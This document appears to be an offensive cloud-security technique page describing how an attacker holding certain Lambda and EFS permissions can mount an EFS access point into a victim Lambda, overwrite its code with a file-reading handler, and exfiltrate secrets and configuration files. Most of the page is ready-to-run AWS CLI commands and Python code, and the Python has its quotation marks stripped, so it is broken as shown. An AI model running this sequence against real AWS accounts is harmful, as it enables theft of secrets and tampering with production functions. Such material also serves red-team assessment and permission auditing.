# AWS Lambda – EFS Mount Injection via UpdateFunctionConfiguration (Data Theft)

Abuse `lambda:UpdateFunctionConfiguration` to attach an existing EFS Access Point to a Lambda, then deploy trivial code that lists/reads files from the mounted path to exfiltrate shared secrets/config that the function previously couldn’t access.

## Requirements
- Permissions on the victim account/principal:
  - `lambda:GetFunctionConfiguration`
  - `lambda:ListFunctions` (to find functions)
  - `lambda:UpdateFunctionConfiguration`
  - `lambda:UpdateFunctionCode`
  - `lambda:InvokeFunction`
  - `efs:DescribeMountTargets` (to confirm mount targets exist)
- Environment assumptions:
  - Target Lambda is VPC-enabled and its subnets/SGs can reach the EFS mount target SG over TCP/2049 (e.g. role has AWSLambdaVPCAccessExecutionRole and VPC routing allows it).
  - The EFS Access Point is in the same VPC and has mount targets in the AZs of the Lambda subnets.

## Attack
- Variables
```
REGION=us-east-1
TARGET_FN=<target-lambda-name>
EFS_AP_ARN=<efs-access-point-arn>
```

1) Attach the EFS Access Point to the Lambda
```
aws lambda update-function-configuration \
  --function-name $TARGET_FN \
  --file-system-configs Arn=$EFS_AP_ARN,LocalMountPath=/mnt/ht \
  --region $REGION
# wait until LastUpdateStatus == Successful
until [ "$(aws lambda get-function-configuration --function-name $TARGET_FN --query LastUpdateStatus --output text --region $REGION)" = "Successful" ]; do sleep 2; done
```

2) Overwrite code with a simple reader that lists files and peeks first 200 bytes of a candidate secret/config file
```
cat > reader.py <<PY
import os, json
BASE=/mnt/ht

def lambda_handler(e, c):
    out={ls:[],peek:None}
    try:
        for root, dirs, files in os.walk(BASE):
            for f in files:
                p=os.path.join(root,f)
                out[ls].append(p)
        cand = next((p for p in out[ls] if secret in p.lower() or config in p.lower()), None)
        if cand:
            with open(cand,rb) as fh:
                out[peek] = fh.read(200).decode(utf-8,ignore)
    except Exception as ex:
        out[err]=str(ex)
    return out
PY
zip reader.zip reader.py
aws lambda update-function-code --function-name $TARGET_FN --zip-file fileb://reader.zip --region $REGION
# If the original handler was different, set it to reader.lambda_handler
aws lambda update-function-configuration --function-name $TARGET_FN --handler reader.lambda_handler --region $REGION
until [ "$(aws lambda get-function-configuration --function-name $TARGET_FN --query LastUpdateStatus --output text --region $REGION)" = "Successful" ]; do sleep 2; done
```

3) Invoke and get the data
```
aws lambda invoke --function-name $TARGET_FN /tmp/efs-out.json --region $REGION >/dev/null
cat /tmp/efs-out.json
```

The output should contain the directory listing under /mnt/ht and a small preview of a chosen secret/config file from EFS.

## Impact
An attacker with the listed permissions can mount arbitrary in-VPC EFS Access Points into victim Lambda functions to read and exfiltrate shared configuration and secrets stored on EFS that were previously inaccessible to that function.

## Cleanup
```
aws lambda update-function-configuration --function-name $TARGET_FN --file-system-configs [] --region $REGION || true
```
